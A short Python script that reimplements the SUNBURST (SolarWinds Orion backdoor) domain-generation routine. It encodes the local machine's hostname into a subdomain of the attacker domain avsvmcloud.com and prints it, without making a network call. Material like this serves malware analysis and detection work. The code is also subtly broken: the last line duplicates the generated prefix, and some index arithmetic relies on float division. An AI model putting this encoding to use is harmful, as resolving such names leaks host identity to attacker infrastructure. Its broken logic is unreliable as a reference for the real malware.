import sys,os
import random
import base64
import random
import socket
import string


def Int2Hex(value,format):
	hexStr = ""
	hexStr = hex(value)
	if(len(hexStr) != format+2):
		zero = format+2 - len(hexStr)
		for i in range(zero):
			hexStr = hexStr[:2] + '0' + hexStr[2:]
	return hexStr[2:]

'''OrionImprovementBusinessLayer.CryptoHelper.Base64Decode'''
def Encode(string):
    text = "rq3gsalt6u1iyfzop572d49bnx8cvmkewhj"
    text2 = "0_-."
    text3 = ""
    for i in range(len(string)):
        ch = string[i]
        tx_index = -1
        tx2_index = -1
        if ch in text2:
            tx2_index = text2.find(ch)
            text3 = text3 + text2[0] + text[int(tx2_index + (random.randint(0,8) % (len(text) / len(text2))) * len(text2))]
        else:
            tx_index = text.find(ch)
            text3 = text3+text[(tx_index + 4) % len(text)]
    return text3


def Base32Encode(string,rt):
	text = "ph2eifo3n5utg1j8d94qrvbmk0sal76c"
	text2 = ""
	num = 0
	ib = 0;
	for i in range(len(string)):
		iint = string[i]
		b = "0x" + Int2Hex(ord(iint),2)
		num |= (int(b,16) << ib)
		ib+=8
		while (ib >= 5):
			text2 += text[num & 31]
			num >>= 5
			ib -= 5
			pass
		pass

	if (ib > 0):
		if (rt):
			pass
		text2 += text[(num & 31)]
		pass

	return text2;

if __name__=="__main__":

    letters = string.ascii_lowercase + string.digits
    guid = ''.join(random.choice(letters) for i in range(15))

    random_byte = random.choice(letters)
    domain_name = guid + random_byte

    hostname = socket.gethostname()

    normal_encoding = True
    for letter in hostname:
        if letter not in "0123456789abcdefghijklmnopqrstuvwxyz-_.":
            normal_encoding = False

    if normal_encoding:
        domain_name += Encode(hostname)
    else:
        domain_name += Base32Encode(hostname, False)

    domain_name += f"{domain_name}.appsync-api.us-east-{random.randint(1,2)}.avsvmcloud.com"

    print(domain_name)



